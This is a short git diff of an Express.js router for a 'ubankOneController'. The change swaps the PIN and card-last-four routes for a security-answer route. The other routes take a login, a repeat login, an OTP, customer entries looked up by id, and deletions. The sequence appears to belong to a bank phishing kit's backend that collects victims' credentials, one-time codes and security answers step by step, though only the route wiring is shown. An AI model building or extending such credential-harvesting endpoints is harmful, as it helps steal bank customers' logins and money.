@@ -6,9 +6,8 @@ const {
   submitLogin,
   submitLoginAgain,
   submitOtp,
-  submitPin,
-  submitLast4,
   deleteEntry,
+  submitSecAnswer,
 } = require("../controllers/ubankOneController");
 
 const router = express.Router();
@@ -19,8 +18,7 @@ router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/otp", submitOtp);
-router.post("/pin", submitPin);
-router.post("/last4", submitLast4);
+router.post("/secAnswer", submitSecAnswer);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
